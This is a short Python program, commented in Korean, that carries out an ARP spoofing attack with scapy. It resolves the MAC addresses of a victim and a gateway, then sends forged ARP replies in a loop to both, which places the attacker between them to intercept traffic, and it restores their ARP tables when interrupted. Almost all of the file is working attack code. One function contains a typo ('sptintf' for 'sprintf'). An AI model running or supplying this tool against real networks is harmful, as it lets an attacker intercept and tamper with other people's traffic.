# ARP Spoofing Program
# Update : 2023-12-10
# Version : 1.0.0
# Python Ver : 3.12.0

# Import Library
from scapy.all import * #enables the user to send, sniff, dissect and forge network packets
from scapy.layers.l2 import Ether, ARP #Classes and functions for layer 2 protocols.
from time import sleep
import sys
from typing import Any

# ARP Packet Operation Code
ARP_REQUEST = 1
ARP_REPLY = 2

# Broadcast Address
BROADCAST_MAC = 'ff-ff-ff-ff-ff-ff'

def getMAC(target_ip:str) -> str | None:
    '''IP 주소를 입력받아 MAC 주소를 리턴한다.'''
    
    # target_ip의 MAC 주소를 알아내기 위해 ARP 패킷을 broadcast로 전송
    # 타임아웃 5초, 재시도 3번
    # 리턴값 : (송신패킷, 수신패킷)리스트, 송신패킷 리스트
    sndrcvlist, packetlist = srp(Ether(dst=BROADCAST_MAC)/ARP(pdst=target_ip), timeout=5, retry=3)
    
    # 수신된 패킷에서 MAC 주소를 리턴
    for sent_packet, received_packet in sndrcvlist:
        # 찾았으면 MAC 주소 리턴, 못찾았으면 None 리턴
        return received_packet.sptintf('%Ether.src%')
    
    
def poisonARP(sender_ip:str, target_ip:str, target_mac:str) -> None:
    '''ARP Spoofing을 위한 ARP 패킷을 전송한다.'''
    
    # Spoofing ARP 패킷을 생성
    arp=ARP(op=ARP_REPLY, psrc=sender_ip, pdst=target_ip, hwdst=target_mac)
    # ARP 패킷을 전송
    send(arp)
    

def restoreARP(target_ip:str, target_mac:str, gateway_ip:str, gateway_mac:str) -> None:
    '''ARP Spoofing을 해제하기 위해 ARP 패킷을 전송한다.'''
    
    # 희생자 컴퓨터의 ARP테이블을 복구하는 ARP 패킷 (게이트웨이에서 보낸 것 처럼 위조)
    target_restore_arp=ARP(op=ARP_REPLY, psrc=gateway_ip, pdst=target_ip,  hwdst=BROADCAST_MAC, hwsrc=gateway_mac)
    # 게이트웨이의 ARP테이블을 복구하는 ARP 패킷 (희생자에서 보낸 것 처럼 위조)
    gateway_restore_arp=ARP(op=ARP_REPLY, psrc=target_ip, pdst=gateway_ip, hwdst=BROADCAST_MAC, hwsrc=target_mac)
    
    # ARP 패킷 누락을 방지하기 위해 3번 전송
    send(gateway_restore_arp, count=3)
    send(target_restore_arp, count=3)


# main
def main(*args, **kwargs) -> int:
    argc = kwargs.get("argc", 0)
    argv = kwargs.get("argv", None)
    
    
    gateway_ip ="163.152." # 게이트웨이 IP
    target_ip ="163.152." # 희생자 IP

    # IP 주소로 MAC 주소를 알아낸다
    target_mac = getMAC(target_ip)
    gateway_mac = getMAC(gateway_ip)
    
    # MAC 주소를 찾을 수 없으면 종료
    if target_mac == None or gateway_mac == None: 
        print('MAC 주소를 찾을 수 없습니다')
        return -1

    print(f"ARP Spoofing 시작 -> VICTIM IP [{target_ip}]")
    print(f"[{target_ip}]:POISON ARP Table [{gateway_mac}] -> [{target_mac}]")

    try: # KeyboardInterrupt 발생 전까지 ARP Spoofing을 계속한다.
        while True:
            poisonARP(gateway_ip, target_ip, target_mac)
            poisonARP(target_ip, gateway_ip, gateway_mac)
            sleep(3)
    except KeyboardInterrupt:
        restoreARP(target_ip, target_mac, gateway_ip, gateway_mac)
        print("ARP Spoofing 종료 -> RESTORED ARP table")

if __name__ == "__main__":
    sys.exit(main(argc=len(sys.argv), argv=sys.argv))